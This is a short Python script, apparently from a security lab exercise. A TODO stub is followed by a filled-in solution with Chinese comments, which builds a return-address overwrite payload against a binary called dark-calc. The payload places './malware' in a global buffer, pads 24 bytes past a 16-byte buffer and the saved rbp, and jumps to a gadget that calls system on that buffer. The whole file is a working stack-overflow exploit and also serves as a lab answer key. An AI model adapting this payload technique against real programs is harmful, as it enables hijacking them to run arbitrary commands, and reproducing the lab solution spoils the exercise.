#!/usr/bin/env python3
"""Task 1: build the payload for attack/dark-calc.

TODO: replace the empty payload with the bytes required by the lab.
"""
#!/usr/bin/env python3
"""Task 1: 劫持 input 的返回地址，让 dark-calc 执行 ./malware。"""
import sys, struct

p64 = lambda x: struct.pack("<Q", x)

payload  = b"./malware\x00"            # strcpy 会把它拷进全局 command_buf
payload += b"A" * (24 - len(payload))  # 16 字节缓冲区 + 8 字节 saved rbp
payload += p64(0x401a6b)               # eval 中 "mov edi, command_buf; call system"

sys.stdout.buffer.write(payload)